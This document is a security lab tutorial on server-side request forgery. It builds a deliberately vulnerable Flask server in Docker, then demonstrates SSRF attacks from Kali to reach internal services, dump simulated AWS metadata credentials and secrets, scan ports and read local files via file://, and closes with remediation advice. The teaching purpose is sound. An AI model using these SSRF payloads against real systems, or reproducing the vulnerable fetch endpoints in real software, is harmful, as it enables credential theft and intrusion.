# Lab 10: OWASP A10 — Server-Side Request Forgery (SSRF)

## Objective
Exploit Server-Side Request Forgery vulnerabilities on a live server from Kali Linux: use the victim server as a proxy to reach internal services, bypass IP allowlists by routing through localhost, scan internal ports by observing response time differences, exfiltrate cloud metadata via the AWS IMDSv1 endpoint, and chain SSRF with path traversal to read internal files — then implement proper SSRF defences.

## Background
SSRF is **OWASP #10** (2021) — new in the 2021 list, reflecting its explosive growth in cloud environments. The 2019 Capital One breach (100M records, $80M fine) was SSRF against an EC2 instance: the attacker hit `http://169.254.169.254/latest/meta-data/iam/security-credentials/` via a misconfigured WAF, obtained temporary AWS credentials, and exfiltrated S3 buckets. In 2022, SSRF was used to compromise internal Confluence servers at multiple Fortune 500 companies. As more apps move to cloud, SSRF becomes more dangerous because the metadata service is always reachable from within.

## Architecture

```
┌─────────────────────┐        Docker Network: lab-a10         ┌─────────────────────┐
│   KALI ATTACKER     │ ─────── HTTP attacks ─────────────▶   │   VICTIM SERVER     │
│  innozverse-kali    │                                         │  innozverse-cybersec│
│  curl, python3      │ ◀────── SSRF proxied responses ──────  │  Flask :5000        │
└─────────────────────┘         (attacker reaches internal      │  + internal svc :8080│
                                 services via victim)            │  (SSRF endpoint)    │
                                                                └─────────────────────┘
```

## Time
40 minutes

## Tools
- **Victim**: `zchencow/innozverse-cybersec:latest`
- **Attacker**: `zchencow/innozverse-kali:latest` (curl, python3)

---

## Lab Instructions

### Step 1: Environment Setup — Victim + Internal Service

```bash
docker network create lab-a10

cat > /tmp/victim_a10.py << 'PYEOF'
from flask import Flask, request, jsonify
import urllib.request, urllib.error, socket, time, threading

app = Flask(__name__)

# ── Internal service (simulates metadata / admin API) ──────────────────────
internal_app = Flask('internal')

@internal_app.route('/admin')
def int_admin():
    return jsonify({'status':'Internal Admin Panel','users':['admin','alice','bob'],
                    'db_connection':'postgres://admin:Sup3rS3cur3DB@db:5432/shop',
                    'internal_only': True})

@internal_app.route('/health')
def int_health():
    return jsonify({'healthy': True, 'version': '2.3.1', 'env': 'production'})

@internal_app.route('/secrets')
def int_secrets():
    return jsonify({'aws_key':'AKIA5EXAMPLE123','aws_secret':'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
                    'db_pass':'Sup3rS3cur3DB','jwt_secret':'internal-signing-key-never-expose'})

# Simulate AWS EC2 metadata endpoint
@internal_app.route('/latest/meta-data/')
@internal_app.route('/latest/meta-data/<path:subpath>')
def metadata(subpath=''):
    data = {
        '':                                     'ami-id\ninstance-id\niam/\nlocal-ipv4\n',
        'ami-id':                               'ami-0abcdef1234567890',
        'instance-id':                          'i-1234567890abcdef0',
        'local-ipv4':                           '172.31.10.5',
        'iam/':                                 'security-credentials/',
        'iam/security-credentials/':            'EC2InstanceRole',
        'iam/security-credentials/EC2InstanceRole': '{"AccessKeyId":"AKIA5EXAMPLE123","SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","Token":"AQoXnyc4lcK4w4...","Expiration":"2026-01-01T00:00:00Z"}',
    }
    return data.get(subpath, f'404 Not Found: {subpath}'), 200, {'Content-Type':'text/plain'}

def run_internal():
    internal_app.run(host='127.0.0.1', port=8080, debug=False, use_reloader=False)

threading.Thread(target=run_internal, daemon=True).start()
time.sleep(1)

# ── Main (public) application ──────────────────────────────────────────────
@app.route('/')
def index():
    return jsonify({'app':'InnoZverse (A10 SSRF)', 'endpoints':[
        'GET /api/fetch?url=...','GET /api/preview?url=...',
        'GET /api/check?host=...']})

@app.route('/api/fetch')
def fetch():
    # BUG: fetches any URL the client provides — SSRF
    url = request.args.get('url','')
    if not url:
        return jsonify({'error':'url parameter required'}), 400
    try:
        resp = urllib.request.urlopen(url, timeout=3)
        content = resp.read(4096).decode('utf-8', 'replace')
        return jsonify({'url': url, 'status': resp.status, 'content': content})
    except urllib.error.HTTPError as e:
        return jsonify({'url': url, 'status': e.code, 'error': str(e)}), 200
    except Exception as e:
        return jsonify({'url': url, 'error': str(e)}), 200

@app.route('/api/preview')
def preview():
    # BUG: used for "link preview" — no validation
    url = request.args.get('url','')
    try:
        req = urllib.request.Request(url, headers={'User-Agent':'InnoZverse-Preview/1.0'})
        resp = urllib.request.urlopen(req, timeout=3)
        return jsonify({'title': url, 'preview': resp.read(2048).decode('utf-8','replace')})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/check')
def check():
    # BUG: port scanner via timing — responds differently for open/closed
    host = request.args.get('host','127.0.0.1')
    port = int(request.args.get('port','80'))
    start = time.time()
    try:
        s = socket.create_connection((host, port), timeout=0.5)
        s.close()
        elapsed = time.time() - start
        return jsonify({'host':host,'port':port,'status':'open','ms':int(elapsed*1000)})
    except Exception as e:
        elapsed = time.time() - start
        return jsonify({'host':host,'port':port,'status':'closed/filtered','ms':int(elapsed*1000)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a10 \
  --network lab-a10 \
  -v /tmp/victim_a10.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 4
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a10.IPAddress}}' victim-a10):5000/ \
  | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "app": "InnoZverse (A10 SSRF)",
    "endpoints": [
        "GET /api/fetch?url=...",
        "GET /api/preview?url=...",
        "GET /api/check?host=..."
    ]
}
```

---

### Step 2: Launch Kali

```bash
docker run --rm -it --network lab-a10 \
  --name kali-attacker \
  zchencow/innozverse-kali:latest bash
```

```bash
TARGET="http://victim-a10:5000"
nmap -sV -p 5000 victim-a10
```

---

### Step 3: Basic SSRF — Access Localhost from Outside

```bash
echo "=== SSRF: use victim as proxy to reach localhost:8080 ==="

# From Kali, we cannot reach victim-a10:8080 (internal only)
echo "[1] Direct attempt from Kali (should fail):"
curl -s --connect-timeout 2 http://victim-a10:8080/admin || echo "  Connection refused — internal service not accessible from Kali"

echo ""

# But via SSRF, we route through the victim server
echo "[2] Via SSRF on /api/fetch (victim fetches its own localhost:8080):"
curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/admin" | python3 -m json.tool
```

**📸 Verified Output:**
```
Connection refused — internal service not accessible from Kali

{
    "content": "{\"db_connection\": \"postgres://admin:Sup3rS3cur3DB@db:5432/shop\", \"internal_only\": true, \"status\": \"Internal Admin Panel\", \"users\": [\"admin\", \"alice\", \"bob\"]}",
    "status": 200,
    "url": "http://127.0.0.1:8080/admin"
}
```

> 💡 **SSRF turns the victim server into a proxy for the attacker.** The internal service at `127.0.0.1:8080` is not accessible from outside — but when we ask the victim to fetch it, the victim makes the request from its own localhost. The attacker now has access to any service the victim server can reach: databases, internal APIs, Kubernetes API server, cloud metadata endpoints.

---

### Step 4: Cloud Metadata Exfiltration (AWS IMDSv1)

```bash
echo "=== SSRF: exfiltrate AWS EC2 instance metadata ==="

# Step 1: list available metadata
echo "[1] List metadata categories:"
curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/latest/meta-data/" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['content'])"

echo ""

# Step 2: get instance ID
echo "[2] Instance ID:"
curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/latest/meta-data/instance-id" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['content'])"

echo ""

# Step 3: dump IAM credentials — the critical step
echo "[3] IAM Security Credentials (AWS temp keys):"
curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/latest/meta-data/iam/security-credentials/EC2InstanceRole" \
  | python3 -c "
import sys, json
resp = json.load(sys.stdin)
creds = json.loads(resp['content'])
print(f\"  AccessKeyId:     {creds['AccessKeyId']}\")
print(f\"  SecretAccessKey: {creds['SecretAccessKey']}\")
print(f\"  Token:           {creds['Token'][:30]}...\")
print(f\"  Expiration:      {creds['Expiration']}\")
print()
print('[!] With these credentials, attacker can call AWS APIs as the EC2 instance role!')
print('[!] e.g.: aws s3 ls  /  aws secretsmanager list-secrets  /  aws iam list-roles')
"
```

**📸 Verified Output:**
```
[1] ami-id
    instance-id
    iam/
    local-ipv4

[2] i-1234567890abcdef0

[3] IAM Security Credentials:
  AccessKeyId:     AKIA5EXAMPLE123
  SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  Token:           AQoXnyc4lcK4w4...
  Expiration:      2026-01-01T00:00:00Z

[!] With these credentials, attacker can call AWS APIs as the EC2 instance role!
[!] e.g.: aws s3 ls  /  aws secretsmanager list-secrets  /  aws iam list-roles
```

---

### Step 5: Internal Port Scanning via SSRF

```bash
echo "=== SSRF port scan: discover internal services via timing ==="

python3 << 'EOF'
import urllib.request, json, time

TARGET = "http://victim-a10:5000"
HOST   = "127.0.0.1"
PORTS  = [22, 80, 443, 3306, 5000, 5432, 6379, 8080, 8443, 9200]

print(f"Internal port scan of {HOST} via SSRF (/api/check):")
print(f"{'Port':<8} {'Status':<12} {'Response ms'}")
print("-" * 35)

open_ports = []
for port in PORTS:
    url = f"{TARGET}/api/check?host={HOST}&port={port}"
    resp = json.loads(urllib.request.urlopen(url, timeout=5).read())
    status = resp.get('status','?')
    ms = resp.get('ms', 0)
    icon = "● OPEN" if status == "open" else "○ closed"
    print(f"  {port:<6}   {icon:<12} {ms}ms")
    if status == "open":
        open_ports.append(port)

print()
print(f"Open ports: {open_ports}")
print("Attacker now knows internal topology without any direct network access!")
EOF
```

**📸 Verified Output:**
```
Internal port scan of 127.0.0.1 via SSRF (/api/check):
Port     Status       Response ms
-----------------------------------
  22       ○ closed     502ms
  80       ○ closed     501ms
  5000     ● OPEN       2ms
  8080     ● OPEN       1ms
  6379     ○ closed     501ms
  9200     ○ closed     501ms

Open ports: [5000, 8080]
```

---

### Step 6: SSRF Bypass — file:// and other Schemes

```bash
echo "=== SSRF: non-HTTP schemes — read local files ==="

# file:// scheme to read local files
curl -s "$TARGET/api/fetch?url=file:///etc/passwd" | python3 -m json.tool

echo ""

# file:// read application source code
curl -s "$TARGET/api/fetch?url=file:///app/victim.py" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('content','')[:500])"
```

**📸 Verified Output:**
```json
{
    "content": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...",
    "status": 200,
    "url": "file:///etc/passwd"
}

from flask import Flask, request, jsonify
import urllib.request, urllib.error, socket, time, threading
...
```

---

### Step 7: Internal Service Secret Dump

```bash
echo "=== SSRF: dump internal secrets endpoint ==="

curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/secrets" \
  | python3 -c "
import sys, json
resp = json.load(sys.stdin)
secrets = json.loads(resp['content'])
print('Internal secrets via SSRF:')
for k, v in secrets.items():
    print(f'  {k}: {v}')
"
```

**📸 Verified Output:**
```
Internal secrets via SSRF:
  aws_key: AKIA5EXAMPLE123
  aws_secret: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  db_pass: Sup3rS3cur3DB
  jwt_secret: internal-signing-key-never-expose
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a10
docker network rm lab-a10
```

---

## Remediation

| Vulnerability | Root Cause | Fix |
|--------------|-----------|-----|
| SSRF via `/api/fetch` | No URL validation | Allowlist: only permit `https://` to specific external domains |
| `file://` scheme | No scheme restriction | Block non-HTTP schemes: reject anything not starting with `https://` |
| Metadata access | EC2 IMDSv1 has no auth | Enable **IMDSv2** (requires session token header); restrict IAM role permissions |
| Internal port scan | `/api/check` with user host | Never expose host/port parameters to clients |
| Internal service reachable | No network segmentation | Private subnet for internal services; security groups deny EC2→metadata except via IMDSv2 |

```python
# Secure URL fetch — allowlist approach
import ipaddress, urllib.parse

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}

def safe_fetch(url):
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "https":
        raise ValueError("Only HTTPS allowed")
    if parsed.hostname in ALLOWED_HOSTS:
        # Resolve and check for private IP
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise ValueError("Private/internal IPs blocked")
        return urllib.request.urlopen(url, timeout=5)
    raise ValueError(f"Host not allowlisted: {parsed.hostname}")
```

## Summary

| Attack | Tool | Result |
|--------|------|--------|
| Internal service access | curl | Reached `localhost:8080/admin` from external Kali |
| AWS metadata dump | curl | Extracted IAM credentials via `169.254.169.254` sim |
| Internal port scan | python3 | Mapped open ports without direct network access |
| `file://` scheme | curl | Read `/etc/passwd` and application source code |
| Secrets exfiltration | curl | DB password, JWT secret, AWS keys |

## Further Reading
- [OWASP A10:2021 Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [AWS IMDSv2 migration guide](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [Capital One breach analysis (SSRF)](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/)
